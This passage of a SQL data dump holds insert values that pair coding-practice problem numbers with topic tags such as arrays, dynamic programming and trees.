Search',133),(371,'Graph',133),(372,'Array',134),(373,'Greedy',134),(374,'Array',135),(375,'Greedy',135),(376,'Array',136),(377,'Bit Manipulation',136),(378,'Array',137),(379,'Bit Manipulation',137),(380,'Hash Table',138),(381,'Linked List',138),(382,'Array',139),(383,'Hash Table',139),(384,'String',139),(385,'Dynamic Programming',139),(386,'Trie',139),(387,'Memoization',139),(388,'Array',140),(389,'Hash Table',140),(390,'String',140),(391,'Dynamic Programming',140),(392,'Backtracking',140),(393,'Trie',140),(394,'Memoization',140),(395,'Hash Table',141),(396,'Linked List',141),(397,'Two Pointers',141),(398,'Hash Table',142),(399,'Linked List',142),(400,'Two Pointers',142),(401,'Linked List',143),(402,'Two Pointers',143),(403,'Stack',143),(404,'Recursion',143),(405,'Stack',144),(406,'Tree',144),(407,'Depth-First Search',144),(408,'Binary Tree',144),(409,'Stack',145),(410,'Tree',145),(411,'Depth-First Search',145),(412,'Binary Tree',145),(413,'Hash Table',146),(414,'Linked List',146),(415,'Design',146),(416,'Doubly-Linked List',146),(417,'Linked List',147),(418,'Sorting',147),(419,'Linked List',148),(420,'Two Pointers',148),(421,'Divide and Conquer',148),(422,'Sorting',148),(423,'Merge Sort',148),(424,'Array',149),(425,'Hash Table',149),(426,'Math',149),(427,'Geometry',149),(428,'Array',150),(429,'Math',150),(430,'Stack',150),(431,'Two Pointers',151),(432,'String',151),(433,'Array',152),(434,'Dynamic Programming',152),(435,'Array',153),(436,'Binary Search',153),(437,'Array',154),(438,'Binary Search',154),(439,'Stack',155),(440,'Design',155),(441,'Tree',156),(442,'Depth-First Search',156),(443,'Binary Tree',156),(444,'Array',157),(445,'Simulation',157),(446,'Interactive',157),(447,'Array',158),(448,'Simulation',158),(449,'Interactive',158),(450,'Hash Table',159),(451,'String',159),(452,'Sliding Window',159),(453,'Hash Table',160),(454,'Linked List',160),(455,'Two Pointers',160),(456,'Two Pointers',161),(457,'String',161),(458,'Array',162),(459,'Binary Search',162),(460,'Array',163),(461,'Array',164),(462,'Sorting',164),(463,'Bucket Sort',164),(464,'Radix Sort',164),(465,'Two Pointers',165),(466,'String',165),(467,'Hash Table',166),(468,'Math',166),(469,'String',166),(470,'Array',167),(471,'Two Pointers',167),(472,'Binary Search',167),(473,'Math',168),(474,'String',168),(475,'Array',169),(476,'Hash Table',169),(477,'Divide and Conquer',169),(478,'Sorting',169),(479,'Counting',169),(480,'Array',170),(481,'Hash Table',170),(482,'Two Pointers',170),(483,'Design',170),(484,'Data Stream',170),(485,'Math',171),(486,'String',171),(487,'Math',172),(488,'Stack',173),(489,'Tree',173),(490,'Design',173),(491,'Binary Search Tree',173),(492,'Binary Tree',173),(493,'Iterator',173),(494,'Array',174),(495,'Dynamic Programming',174),(496,'Matrix',174),(497,'Database',175),(498,'Database',176),(499,'Database',177),(500,'Database',178),(501,'Array',179),(502,'String',179),(503,'Greedy',179),(504,'Sorting',179),(505,'Database',180),(506,'Database',181),(507,'Database',182),(508,'Database',183),(509,'Database',184),(510,'Database',185),(511,'Two Pointers',186),(512,'String',186),(513,'Hash Table',187),(514,'String',187),(515,'Bit Manipulation',187),(516,'Sliding Window',187),(517,'Rolling Hash',187),(518,'Hash Function',187),(519,'Array',188),(520,'Dynamic Programming',188),(521,'Array',189),(522,'Math',189),(523,'Two Pointers',189),(524,'Divide and Conquer',190),(525,'Bit Manipulation',190),(526,'Divide and Conquer',191),(527,'Bit Manipulation',191),(528,'Shell',192),(529,'Shell',193),(530,'Shell',194),(531,'Shell',195),(532,'Database',196),(533,'Database',197),(534,'Array',198),(535,'Dynamic Programming',198),(536,'Tree',199),(537,'Depth-First Search',199),(538,'Breadth-First Search',199),(539,'Binary Tree',199),(540,'Array',200),(541,'Depth-First Search',200),(542,'Breadth-First Search',200),(543,'Union Find',200),(544,'Matrix',200),(545,'Bit Manipulation',201),(546,'Hash Table',202),(547,'Math',202),(548,'Two Pointers',202),(549,'Linked List',203),(550,'Recursion',203),(551,'Array',204),(552,'Math',204),(553,'Enumeration',204),(554,'Number Theory',204),(555,'Hash Table',205),(556,'String',205),(557,'Linked List',206),(558,'Recursion',206),(559,'Depth-First Search',207),(560,'Breadth-First Search',207),(561,'Graph',207),(562,'Topological Sort',207),(563,'Hash Table',208),(564,'String',208),(565,'Design',208),(566,'Trie',208),(567,'Array',209),(568,'Binary Search',209),(569,'Sliding Window',209),(570,'Prefix Sum',209),(571,'Depth-First Search',210),(572,'Breadth-First Search',210),(573,'Graph',210),(574,'Topological Sort',210),(575,'String',211),(576,'Depth-First Search',211),(577,'Design',211),(578,'Trie',211),(579,'Array',212),(580,'String',212),(581,'Backtracking',212),(582,'Trie',212),(583,'Matrix',212),(584,'Array',213),(585,'Dynamic Programming',213),(586,'String',214),(587,'Rolling Hash',214),(588,'String Matching',214),(589,'Hash Function',214),(590,'Array',215),(591,'Divide and Conquer',215),(592,'Sorting',215),(593,'Heap (Priority Queue)',215),(594,'Quickselect',215),(595,'Array',216),(596,'Backtracking',216),(597,'Array',217),(598,'Hash Table',217),(599,'Sorting',217),(600,'Array',218),(601,'Divide and Conquer',218),(602,'Binary Indexed Tree',218),(603,'Segment Tree',218),(604,'Line Sweep',218),(605,'Heap (Priority Queue)',218),(606,'Ordered Set',218),(607,'Array',219),(608,'Hash Table',219),(609,'Sliding Window',219),(610,'Array',220),(611,'Sliding Window',220),(612,'Sorting',220),(613,'Bucket Sort',220),(614,'Ordered Set',220),(615,'Array',221),(616,'Dynamic Programming',221),(617,'Matrix',221),(618,'Binary Search',222),(619,'Bit Manipulation',222),(620,'Tree',222),(621,'Binary Tree',222),(622,'Math',223),(623,'Geometry',223),(624,'Math',224),(625,'String',224),(626,'Stack',224),(627,'Recursion',224),(628,'Stack',225),(629,'Design',225),(630,'Queue',225),(631,'Tree',226),(632,'Depth-First Search',226),(633,'Breadth-First Search',226),(634,'Binary Tree',226),(635,'Math',227),(636,'String',227),(637,'Stack',227),(638,'Array',228),(639,'Array',229),(640,'Hash Table',229),(641,'Sorting',229),(642,'Counting',229),(643,'Tree',230),(644,'Depth-First Search',230),(645,'Binary Search Tree',230),(646,'Binary Tree',230),(647,'Math',231),(648,'Bit Manipulation',231),(649,'Recursion',231),(650,'Stack',232),(651,'Design',232),(652,'Queue',232),(653,'Math',233),(654,'Dynamic Programming',233),(655,'Recursion',233),(656,'Linked List',234),(657,'Two Pointers',234),(658,'Stack',234),(659,'Recursion',234),(660,'Tree',235),(661,'Depth-First Search',235),(662,'Binary Search Tree',235),(663,'Binary Tree',235),(664,'Tree',236),(665,'Depth-First Search',236),(666,'Binary Tree',236),(667,'Linked List',237),(668,'Array',238),(669,'Prefix Sum',238),(670,'Array',239),(671,'Queue',239),(672,'Sliding Window',239),(673,'Heap (Priority Queue)',239),(674,'Monotonic Queue',239),(675,'Array',240),(676,'Binary Search',240),(677,'Divide and Conquer',240),(678,'Matrix',240),(679,'Math',241),(680,'String',241),(681,'Dynamic Programming',241),(682,'Recursion',241),(683,'Memoization',241),(684,'Hash Table',242),(685,'String',242),(686,'Sorting',242),(687,'Array',243),(688,'String',243),(689,'Array',244),(690,'Hash Table',244),(691,'Two Pointers',244),(692,'String',244),(693,'Design',244),(694,'Array',245),(695,'String',245),(696,'Hash Table',246),(697,'Two Pointers',246),(698,'String',246),(699,'Array',247),(700,'String',247),(701,'Recursion',247),(702,'Array',248),(703,'String',248),(704,'Recursion',248),(705,'Array',249),(706,'Hash Table',249),(707,'String',249),(708,'Tree',250),(709,'Depth-First Search',250),(710,'Binary Tree',250),(711,'Array',251),(712,'Two Pointers',251),(713,'Design',251),(714,'Iterator',251),(715,'Array',252),(716,'Sorting',252),(717,'Array',253),(718,'Two Pointers',253),(719,'Greedy',253),(720,'Sorting',253),(721,'Heap (Priority Queue)',253),(722,'Prefix Sum',253),(723,'Array',254),(724,'Backtracking',254),(725,'Stack',255),(726,'Tree',255),(727,'Binary Search Tree',255),(728,'Recursion',255),(729,'Monotonic Stack',255),(730,'Binary Tree',255),(731,'Array',256),(732,'Dynamic Programming',256),(733,'String',257),(734,'Backtracking',257),(735,'Tree',257),(736,'Depth-First Search',257),(737,'Binary Tree',257),(738,'Math',258),(739,'Simulation',258),(740,'Number Theory',258),(741,'Array',259),(742,'Two Pointers',259),(743,'Binary Search',259),(744,'Sorting',259),(745,'Array',260),(746,'Bit Manipulation',260),(747,'Depth-First Search',261),(748,'Breadth-First Search',261),(749,'Union Find',261),(750,'Graph',261),(751,'Database',262),(752,'Math',263),(753,'Hash Table',264),(754,'Math',264),(755,'Dynamic Programming',264),(756,'Heap (Priority Queue)',264),(757,'Array',265),(758,'Dynamic Programming',265),(759,'Hash Table',266),(760,'String',266),(761,'Bit Manipulation',266),(762,'Hash Table',267),(763,'String',267),(764,'Backtracking',267),(765,'Array',268),(766,'Hash Table',268),(767,'Math',268),(768,'Binary Search',268),(769,'Bit Manipulation',268),(770,'Sorting',268),(771,'Array',269),(772,'String',269),(773,'Depth-First Search',269),(774,'Breadth-First Search',269),(775,'Graph',269),(776,'Topological Sort',269),(777,'Binary Search',270),(778,'Tree',270),(779,'Depth-First Search',270),(780,'Binary Search Tree',270),(781,'Binary Tree',270),(782,'Array',271),(783,'String',271),(784,'Design',271),(785,'Two Pointers',272),(786,'Stack',272),(787,'Tree',272),(788,'Depth-First Search',272),(789,'Binary Search Tree',272),(790,'Heap (Priority Queue)',272),(791,'Binary Tree',272),(792,'Math',273),(793,'String',273),(794,'Recursion',273),(795,'Array',274),(796,'Sorting',274),(797,'Counting Sort',274),(798,'Array',275),(799,'Binary Search',275),(800,'Dynamic Programming',276),(801,'Two Pointers',277),(802,'Graph',277),(803,'Interactive',277),(804,'Binary Search',278),(805,'Interactive',278),(806,'Math',279),(807,'Dynamic Programming',279),(808,'Breadth-First Search',279),(809,'Array',280),(810,'Greedy',280),(811,'Sorting',280),(812,'Array',281),(813,'Design',281),(814,'Queue',281),(815,'Iterator',281),(816,'Math',282),(817,'String',282),(818,'Backtracking',282),(819,'Array',283),(820,'Two Pointers',283),(821,'Array',284),(822,'Design',284),(823,'Iterator',284),(824,'Tree',285),(825,'Depth-First Search',285),(826,'Binary Search Tree',285),(827,'Binary Tree',285),(828,'Array',286),(829,'Breadth-First Search',286),(830,'Matrix',286),(831,'Array',287),(832,'Two Pointers',287),(833,'Binary Search',287),(834,'Bit Manipulation',287),(835,'Array',288),(836,'Hash Table',288),(837,'String',288),(838,'Design',288),(839,'Array',289),(840,'Matrix',289),(841,'Simulation',289),(842,'Hash Table',290),(843,'String',290),(844,'Hash Table',291),(845,'String',291),(846,'Backtracking',291),(847,'Math',292),(848,'Brainteaser',292),(849,'Game Theory',292),(850,'String',293),(851,'Math',294),(852,'Dynamic Programming',294),(853,'Backtracking',294),(854,'Memoization',294),(855,'Game Theory',294),(856,'Two Pointers',295),(857,'Design',295),(858,'Sorting',295),(859,'Heap (Priority Queue)',295),(860,'Data Stream',295),(861,'Array',296),(862,'Math',296),(863,'Sorting',296),(864,'Matrix',296),(865,'String',297),(866,'Tree',297),(867,'Depth-First Search',297),(868,'Breadth-First Search',297),(869,'Design',297),(870,'Binary Tree',297),(871,'Tree',298),(872,'Depth-First Search',298),(873,'Binary Tree',298),(874,'Hash Table',299),(875,'String',299),(876,'Counting',299),(877,'Array',300),(878,'Binary Search',300),(879,'Dynamic Programming',300),(880,'String',301),(881,'Backtracking',301),(882,'Breadth-First Search',301),(883,'Array',302),(884,'Binary Search',302),(885,'Depth-First Search',302),(886,'Breadth-First Search',302),(887,'Matrix',302),(888,'Array',303),(889,'Design',303),(890,'Prefix Sum',303),(891,'Array',304),(892,'Design',304),(893,'Matrix',304),(894,'Prefix Sum',304),(895,'Array',305),(896,'Union Find',305),(897,'String',306),(898,'Backtracking',306),(899,'Array',307),(900,'Design',307),(901,'Binary Indexed Tree',307),(902,'Segment Tree',307),(903,'Array',308),(904,'Design',308),(905,'Binary Indexed Tree',308),(906,'Segment Tree',308),(907,'Matrix',308),(908,'Array',309),(909,'Dynamic Programming',309),(910,'Depth-First Search',310),(911,'Breadth-First Search',310),(912,'Graph',310),(913,'Topological Sort',310),(914,'Array',311),(915,'Hash Table',311),(916,'Matrix',311),(917,'Array',312),(918,'Dynamic Programming',312),(919,'Array',313),(920,'Math',313),(921,'Dynamic Programming',313),(922,'Hash Table',314),(923,'Tree',314),(924,'Depth-First Search',314),(925,'Breadth-First Search',314),(926,'Binary Tree',314),(927,'Array',315),(928,'Binary Search',315),(929,'Divide and Conquer',315),(930,'Binary Indexed Tree',315),(931,'Segment Tree',315),(932,'Merge Sort',315),(933,'Ordered Set',315),(934,'String',316),(935,'Stack',316),(936,'Greedy',316),(937,'Monotonic Stack',316),(938,'Array',317),(939,'Breadth-First Search',317),(940,'Matrix',317),(941,'Array',318),(942,'String',318),(943,'Bit Manipulation',318),(944,'Math',319),(945,'Brainteaser',319),(946,'String',320),(947,'Backtracking',320),(948,'Bit Manipulation',320),(949,'Stack',321),(950,'Greedy',321),(951,'Monotonic Stack',321),(952,'Array',322),(953,'Dynamic Programming',322),(954,'Breadth-First Search',322),(955,'Depth-First Search',323),(956,'Breadth-First Search',323),(957,'Union Find',323),(958,'Graph',323),(959,'Array',324),(960,'Divide and Conquer',324),(961,'Sorting',324),(962,'Quickselect',324),(963,'Array',325),(964,'Hash Table',325),(965,'Prefix Sum',325),(966,'Math',326),(967,'Recursion',326),(968,'Array',327),(969,'Binary Search',327),(970,'Divide and Conquer',327),(971,'Binary Indexed Tree',327),(972,'Segment Tree',327),(973,'Merge Sort',327),(974,'Ordered Set',327),(975,'Linked List',328),(976,'Array',329),(977,'Dynamic Programming',329),(978,'Depth-First Search',329),(979,'Breadth-First Search',329),(980,'Graph',329),(981,'Topological Sort',329),(982,'Memoization',329),(983,'Matrix',329),(984,'Array',330),(985,'Greedy',330),(986,'String',331),(987,'Stack',331),(988,'Tree',331),(989,'Binary Tree',331),(990,'Depth-First Search',332),(991,'Graph',332),(992,'Eulerian Circuit',332),(993,'Dynamic Programming',333),(994,'Tree',333),(995,'Depth-First Search',333),(996,'Binary Search Tree',333),(997,'Binary Tree',333),(998,'Array',334),(999,'Greedy',334),(1000,'Array',335),(1001,'Math',335),(1002,'Geometry',335),(1003,'Array',336),(1004,'Hash Table',336),(1005,'String',336),(1006,'Trie',336),(1007,'Dynamic Programming',337),(1008,'Tree',337),(1009,'Depth-First Search',337),(1010,'Binary Tree',337),(1011,'Dynamic Programming',338),(1012,'Bit Manipulation',338),(1013,'Depth-First Search',339),(1014,'Breadth-First Search',339),(1015,'Hash Table',340),(1016,'String',340),(1017,'Sliding Window',340),(1018,'Stack',341),(1019,'Tree',341),(1020,'Depth-First Search',341),(1021,'Design',341),(1022,'Queue',341),(1023,'Iterator',341),(1024,'Math',342),(1025,'Bit Manipulation',342),(1026,'Recursion',342),(1027,'Math',343),(1028,'Dynamic Programming',343),(1029,'Two Pointers',344),(1030,'String',344),(1031,'Two Pointers',345),(1032,'String',345),(1033,'Array',346),(1034,'Design',346),(1035,'Queue',346),(1036,'Data Stream',346),(1037,'Array',347),(1038,'Hash Table',347),(1039,'Divide and Conquer',347),(1040,'Sorting',347),(1041,'Heap (Priority Queue)',347),(1042,'Bucket Sort',347),(1043,'Counting',347),(1044,'Quickselect',347),(1045,'Array',348),(1046,'Hash Table',348),(1047,'Design',348),(1048,'Matrix',348),(1049,'Simulation',348),(1050,'Array',349),(1051,'Hash Table',349),(1052,'Two Pointers',349),(1053,'Binary Search',349),(1054,'Sorting',349),(1055,'Array',350),(1056,'Hash Table',350),(1057,'Two Pointers',350),(1058,'Binary Search',350),(1059,'Sorting',350),(1060,'Dynamic Programming',351),(1061,'Backtracking',351),(1062,'Binary Search',352),(1063,'Design',352),(1064,'Ordered Set',352),(1065,'Array',353),(1066,'Hash Table',353),(1067,'Design',353),(1068,'Queue',353),(1069,'Simulation',353),(1070,'Array',354),(1071,'Binary Search',354),(1072,'Dynamic Programming',354),(1073,'Sorting',354),(1074,'Hash Table',355),(1075,'Linked List',355),(1076,'Design',355),(1077,'Heap (Priority Queue)',355),(1078,'Array',356),(1079,'Hash Table',356),(1080,'Math',356),(1081,'Math',357),(1082,'Dynamic Programming',357),(1083,'Backtracking',357),(1084,'Hash Table',358),(1085,'String',358),(1086,'Greedy',358),(1087,'Sorting',358),(1088,'Heap (Priority Queue)',358),(1089,'Counting',358),(1090,'Hash Table',359),(1091,'Design',359),(1092,'Data Stream',359),(1093,'Array',360),(1094,'Math',360),(1095,'Two Pointers',360),(1096,'Sorting',360),(1097,'Array',361),(1098,'Dynamic Programming',361),(1099,'Matrix',361),(1100,'Array',362),(1101,'Hash Table',362),(1102,'Binary Search',362),(1103,'Design',362),(1104,'Queue',362),(1105,'Array',363),(1106,'Binary Search',363),(1107,'Matrix',363),(1108,'Prefix Sum',363),(1109,'Ordered Set',363),(1110,'Stack',364),(1111,'Depth-First Search',364),(1112,'Breadth-First Search',364),(1113,'Math',365),(1114,'Depth-First Search',365),(1115,'Breadth-First Search',365),(1116,'Tree',366),(1117,'Depth-First Search',366),(1118,'Binary Tree',366),(1119,'Math',367),(1120,'Binary Search',367),(1121,'Array',368),(1122,'Math',368),(1123,'Dynamic Programming',368),(1124,'Sorting',368),(1125,'Linked List',369),(1126,'Math',369),(1127,'Array',370),(1128,'Prefix Sum',370),(1129,'Math',371),(1130,'Bit Manipulation',371),(1131,'Math',372),(1132,'Divide and Conquer',372),(1133,'Array',373),(1134,'Heap (Priority Queue)',373),(1135,'Binary Search',374),(1136,'Interactive',374),(1137,'Math',375),(1138,'Dynamic Programming',375),(1139,'Game Theory',375),(1140,'Array',376),(1141,'Dynamic Programming',376),(1142,'Greedy',376),(1143,'Array',377),(1144,'Dynamic Programming',377),(1145,'Array',378),(1146,'Binary Search',378),(1147,'Sorting',378),(1148,'Heap (Priority Queue)',378),(1149,'Matrix',378),(1150,'Array',379),(1151,'Hash Table',379),(1152,'Linked List',379),(1153,'Design',379),(1154,'Queue',379),(1155,'Array',380),(1156,'Hash Table',380),(1157,'Math',380),(1158,'Design',380),(1159,'Randomized',380),(1160,'Array',381),(1161,'Hash Table',381),(1162,'Math',381),(1163,'Design',381),(1164,'Randomized',381),(1165,'Linked List',382),(1166,'Math',382),(1167,'Reservoir Sampling',382),(1168,'Randomized',382),(1169,'Hash Table',383),(1170,'String',383),(1171,'Counting',383),(1172,'Array',384),(1173,'Math',384),(1174,'Randomized',384),(1175,'String',385),(1176,'Stack',385),(1177,'Depth-First Search',385),(1178,'Depth-First Search',386),(1179,'Trie',386),(1180,'Hash Table',387),(1181,'String',387),(1182,'Queue',387),(1183,'Counting',387),(1184,'String',388),(1185,'Stack',388),(1186,'Depth-First Search',388),(1187,'Hash Table',389),(1188,'String',389),(1189,'Bit Manipulation',389),(1190,'Sorting',389),(1191,'Math',390),(1192,'Recursion',390),(1193,'Array',391),(1194,'Line Sweep',391),(1195,'Two Pointers',392),(1196,'String',392),(1197,'Dynamic Programming',392),(1198,'Array',393),(1199,'Bit Manipulation',393),(1200,'String',394),(1201,'Stack',394),(1202,'Recursion',394),(1203,'Hash Table',395),(1204,'String',395),(1205,'Divide and Conquer',395),(1206,'Sliding Window',395),(1207,'Array',396),(1208,'Math',396),(1209,'Dynamic Programming',396),(1210,'Dynamic Programming',397),(1211,'Greedy',397),(1212,'Bit Manipulation',397),(1213,'Memoization',397),(1214,'Hash Table',398),(1215,'Math',398),(1216,'Reservoir Sampling',398),(1217,'Randomized',398),(1218,'Array',399),(1219,'Depth-First Search',399),(1220,'Breadth-First Search',399),(1221,'Union Find',399),(1222,'Graph',399),(1223,'Shortest Path',399),(1224,'Math',400),(1225,'Binary Search',400),(1226,'Backtracking',401),(1227,'Bit Manipulation',401),(1228,'String',402),(1229,'Stack',402),(1230,'Greedy',402),(1231,'Monotonic Stack',402),(1232,'Array',403),(1233,'Dynamic Programming',403),(1234,'Tree',404),(1235,'Depth-First Search',404),(1236,'Breadth-First Search',404),(1237,'Binary Tree',404),(1238,'Math',405),(1239,'Bit Manipulation',405),(1240,'Array',406),(1241,'Greedy',406),(1242,'Binary Indexed Tree',406),(1243,'Segment Tree',406),(1244,'Sorting',406),(1245,'Array',407),(1246,'Breadth-First Search',407),(1247,'Heap (Priority Queue)',407),(1248,'Matrix',407),(1249,'Two Pointers',408),(1250,'String',408),(1251,'Hash Table',409),(1252,'String',409),(1253,'Greedy',409),(1254,'Array',410),(1255,'Binary Search',410),(1256,'Dynamic Programming',410),(1257,'Greedy',410),(1258,'Prefix Sum',410),(1259,'String',411),(1260,'Backtracking',411),(1261,'Bit Manipulation',411),(1262,'Math',412),(1263,'String',412),(1264,'Simulation',412),(1265,'Array',413),(1266,'Dynamic Programming',413),(1267,'Array',414),(1268,'Sorting',414),(1269,'Math',415),(1270,'String',415),(1271,'Simulation',415),(1272,'Array',416),(1273,'Dynamic Programming',416),(1274,'Array',417),(1275,'Depth-First Search',417),(1276,'Breadth-First Search',417),(1277,'Matrix',417),(1278,'String',418),(1279,'Dynamic Programming',418),(1280,'Simulation',418),(1281,'Array',419),(1282,'Depth-First Search',419),(1283,'Matrix',419),(1284,'String',420),(1285,'Greedy',420),(1286,'Heap (Priority Queue)',420),(1287,'Array',421),(1288,'Hash Table',421),(1289,'Bit Manipulation',421),(1290,'Trie',421),(1291,'Array',422),(1292,'Matrix',422),(1293,'Hash Table',423),(1294,'Math',423),(1295,'String',423),(1296,'Hash Table',424),(1297,'String',424),(1298,'Sliding Window',424),(1299,'Array',425),(1300,'String',425),(1301,'Backtracking',425),(1302,'Trie',425),(1303,'Linked List',426),(1304,'Stack',426),(1305,'Tree',426),(1306,'Depth-First Search',426),(1307,'Binary Search Tree',426),(1308,'Binary Tree',426),(1309,'Doubly-Linked List',426),(1310,'Array',427),(1311,'Divide and Conquer',427),(1312,'Tree',427),(1313,'Matrix',427),(1314,'String',428),(1315,'Tree',428),(1316,'Depth-First Search',428),(1317,'Breadth-First Search',428),(1318,'Tree',429),(1319,'Breadth-First Search',429),(1320,'Linked List',430),(1321,'Depth-First Search',430),(1322,'Doubly-Linked List',430),(1323,'Tree',431),(1324,'Depth-First Search',431),(1325,'Breadth-First Search',431),(1326,'Design',431),(1327,'Binary Tree',431),(1328,'Hash Table',432),(1329,'Linked List',432),(1330,'Design',432),(1331,'Doubly-Linked List',432),(1332,'Hash Table',433),(1333,'String',433),(1334,'Breadth-First Search',433),(1335,'String',434),(1336,'Array',435),(1337,'Dynamic Programming',435),(1338,'Greedy',435),(1339,'Sorting',435),(1340,'Array',436),(1341,'Binary Search',436),(1342,'Sorting',436),(1343,'Tree',437),(1344,'Depth-First Search',437),(1345,'Binary Tree',437),(1346,'Hash Table',438),(1347,'String',438),(1348,'Sliding Window',438),(1349,'String',439),(1350,'Stack',439),(1351,'Recursion',439),(1352,'Trie',440),(1353,'Math',441),(1354,'Binary Search',441),(1355,'Array',442),(1356,'Hash Table',442),(1357,'Two Pointers',443),(1358,'String',443),(1359,'Array',444),(1360,'Graph',444),(1361,'Topological Sort',444),(1362,'Linked List',445),(1363,'Math',445),(1364,'Stack',445),(1365,'Array',446),(1366,'Dynamic Programming',446),(1367,'Array',447),(1368,'Hash Table',447),(1369,'Math',447),(1370,'Array',448),(1371,'Hash Table',448),(1372,'String',449),(1373,'Tree',449),(1374,'Depth-First Search',449),(1375,'Breadth-First Search',449),(1376,'Design',449),(1377,'Binary Search Tree',449),(1378,'Binary Tree',449),(1379,'Tree',450),(1380,'Binary Search Tree',450),(1381,'Binary Tree',450),(1382,'Hash Table',451),(1383,'String',451),(1384,'Sorting',451),(1385,'Heap (Priority Queue)',451),(1386,'Bucket Sort',451),(1387,'Counting',451),(1388,'Array',452),(1389,'Greedy',452),(1390,'Sorting',452),(1391,'Array',453),(1392,'Math',453),(1393,'Array',454),(1394,'Hash Table',454),(1395,'Array',455),(1396,'Two Pointers',455),(1397,'Greedy',455),(1398,'Sorting',455),(1399,'Array',456),(1400,'Binary Search',456),(1401,'Stack',456),(1402,'Monotonic Stack',456),(1403,'Ordered Set',456),(1404,'Array',457),(1405,'Hash Table',457),(1406,'Two Pointers',457),(1407,'Math',458),(1408,'Dynamic Programming',458),(1409,'Combinatorics',458),(1410,'String',459),(1411,'String Matching',459),(1412,'Hash Table',460),(1413,'Linked List',460),(1414,'Design',460),(1415,'Doubly-Linked List',460),(1416,'Bit Manipulation',461),(1417,'Array',462),(1418,'Math',462),(1419,'Sorting',462),(1420,'Array',463),(1421,'Depth-First Search',463),(1422,'Breadth-First Search',463),(1423,'Matrix',463),(1424,'Math',464),(1425,'Dynamic Programming',464),(1426,'Bit Manipulation',464),(1427,'Memoization',464),(1428,'Game Theory',464),(1429,'Bitmask',464),(1430,'Array',465),(1431,'Dynamic Programming',465),(1432,'Backtracking',465),(1433,'Bit Manipulation',465),(1434,'Bitmask',465),(1435,'String',466),(1436,'Dynamic Programming',466),(1437,'String',467),(1438,'Dynamic Programming',467),(1439,'String',468),(1440,'Math',469),(1441,'Geometry',469),(1442,'Math',470),(1443,'Rejection Sampling',470),(1444,'Randomized',470),(1445,'Probability and Statistics',470),(1446,'String',471),(1447,'Dynamic Programming',471),(1448,'Array',472),(1449,'String',472),(1450,'Dynamic Programming',472),(1451,'Depth-First Search',472),(1452,'Trie',472),(1453,'Array',473),(1454,'Dynamic Programming',473),(1455,'Backtracking',473),(1456,'Bit Manipulation',473),(1457,'Bitmask',473),(1458,'Array',474),(1459,'String',474),(1460,'Dynamic Programming',474),(1461,'Array',475),(1462,'Two Pointers',475),(1463,'Binary Search',475),(1464,'Sorting',475),(1465,'Bit Manipulation',476),(1466,'Array',477),(1467,'Math',477),(1468,'Bit Manipulation',477),(1469,'Math',478),(1470,'Geometry',478),(1471,'Rejection Sampling',478),(1472,'Randomized',478),(1473,'Math',479),(1474,'Array',480),(1475,'Hash Table',480),(1476,'Sliding Window',480),(1477,'Heap (Priority Queue)',480),(1478,'Two Pointers',481),(1479,'String',481),(1480,'String',482),(1481,'Math',483),(1482,'Binary Search',483),(1483,'Array',484),(1484,'String',484),(1485,'Stack',484),(1486,'Greedy',484),(1487,'Array',485),(1488,'Array',486),(1489,'Math',486),(1490,'Dynamic Programming',486),(1491,'Recursion',486),(1492,'Game Theory',486),(1493,'Array',487),(1494,'Dynamic Programming',487),(1495,'Sliding Window',487),(1496,'String',488),(1497,'Dynamic Programming',488),(1498,'Stack',488),(1499,'Breadth-First Search',488),(1500,'Memoization',488),(1501,'Backtracking',489),(1502,'Interactive',489),(1503,'Array',490),(1504,'Depth-First Search',490),(1505,'Breadth-First Search',490),(1506,'Matrix',490),(1507,'Array',491),(1508,'Hash Table',491),(1509,'Backtracking',491),(1510,'Bit Manipulation',491),(1511,'Math',492),(1512,'Array',493),(1513,'Binary Search',493),(1514,'Divide and Conquer',493),(1515,'Binary Indexed Tree',493),(1516,'Segment Tree',493),(1517,'Merge Sort',493),(1518,'Ordered Set',493),(1519,'Array',494),(1520,'Dynamic Programming',494),(1521,'Backtracking',494),(1522,'Array',495),(1523,'Simulation',495),(1524,'Array',496),(1525,'Hash Table',496),(1526,'Stack',496),(1527,'Monotonic Stack',496),(1528,'Array',497),(1529,'Math',497),(1530,'Binary Search',497),(1531,'Reservoir Sampling',497),(1532,'Prefix Sum',497),(1533,'Ordered Set',497),(1534,'Randomized',497),(1535,'Array',498),(1536,'Matrix',498),(1537,'Simulation',498),(1538,'Array',499),(1539,'String',499),(1540,'Depth-First Search',499),(1541,'Breadth-First Search',499),(1542,'Graph',499),(1543,'Heap (Priority Queue)',499),(1544,'Matrix',499),(1545,'Shortest Path',499),(1546,'Array',500),(1547,'Hash Table',500),(1548,'String',500),(1549,'Tree',501),(1550,'Depth-First Search',501),(1551,'Binary Search Tree',501),(1552,'Binary Tree',501),(1553,'Array',502),(1554,'Greedy',502),(1555,'Sorting',502),(1556,'Heap (Priority Queue)',502),(1557,'Array',503),(1558,'Stack',503),(1559,'Monotonic Stack',503),(1560,'Math',504),(1561,'Array',505),(1562,'Depth-First Search',505),(1563,'Breadth-First Search',505),(1564,'Graph',505),(1565,'Heap (Priority Queue)',505),(1566,'Matrix',505),(1567,'Shortest Path',505),(1568,'Array',506),(1569,'Sorting',506),(1570,'Heap (Priority Queue)',506),(1571,'Math',507),(1572,'Hash Table',508),(1573,'Tree',508),(1574,'Depth-First Search',508),(1575,'Binary Tree',508),(1576,'Math',509),(1577,'Dynamic Programming',509),(1578,'Recursion',509),(1579,'Memoization',509),(1580,'Tree',510),(1581,'Binary Search Tree',510),(1582,'Binary Tree',510),(1583,'Database',511),(1584,'Database',512),(1585,'Tree',513),(1586,'Depth-First Search',513),(1587,'Breadth-First Search',513),(1588,'Binary Tree',513),(1589,'String',514),(1590,'Dynamic Programming',514),(1591,'Depth-First Search',514),(1592,'Breadth-First Search',514),(1593,'Tree',515),(1594,'Depth-First Search',515),(1595,'Breadth-First Search',515),(1596,'Binary Tree',515),(1597,'String',516),(1598,'Dynamic Programming',516),(1599,'Array',517),(1600,'Greedy',517),(1601,'Array',518),(1602,'Dynamic Programming',518),(1603,'Hash Table',519),(1604,'Math',519),(1605,'Reservoir Sampling',519),(1606,'Randomized',519),(1607,'String',520),(1608,'String',521),(1609,'Array',522),(1610,'Hash Table',522),(1611,'Two Pointers',522),(1612,'String',522),(1613,'Sorting',522),(1614,'Array',523),(1615,'Hash Table',523),(1616,'Math',523),(1617,'Prefix Sum',523),(1618,'Array',524),(1619,'Two Pointers',524),(1620,'String',524),(1621,'Sorting',524),(1622,'Array',525),(1623,'Hash Table',525),(1624,'Prefix Sum',525),(1625,'Array',526),(1626,'Dynamic Programming',526),(1627,'Backtracking',526),(1628,'Bit 